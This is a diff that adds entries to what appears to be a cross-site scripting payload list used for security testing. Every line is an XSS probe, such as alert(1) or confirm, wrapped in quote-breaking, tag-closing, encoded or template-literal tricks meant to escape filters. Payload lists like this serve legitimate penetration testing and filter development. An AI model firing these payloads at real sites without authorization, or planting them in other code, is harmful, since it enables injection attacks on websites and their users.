@@ -6,12 +6,21 @@ javascript:alert(1)
 %5c%27%3balert(1)%2f%2f
 %3Cscript%3Ealert(1)%3C%2Fscript%3E
 <script>{onerror=alert}throw 1</script>
+<script>alert&#40;1&#41;</script>
 "><svg onload=alert()>
 "><svg onload=alert()><b attr="
 '-alert()-'
 '-alert()//'
 '}alert(1);{'
 '}%0Aalert(1);%0A{'
+");alert(1);//
+\");alert(1);//
+</script><script>alert(1)//
+});alert(1);//
+]);alert(1);//
+\x3cscript\x3ealert(1)\x3c/script\x3e
+</textarea><script>alert(1)</script>
+</input><script>alert(1)</script>
 <!--<img src="--><img src=x onerror=javascript:alert(1)//">
 \"><img%20src=x%20onerror=javascript:alert(`1`)>
 </script><svg onload=alert()>
@@ -25,6 +34,7 @@ confirm``
 (confirm``)
 {confirm``}
 [confirm``]
+${alert(1)}
 (((confirm)))``
 co\u006efirm()
 <d3"<"/onclick="1>[confirm``]"<">z
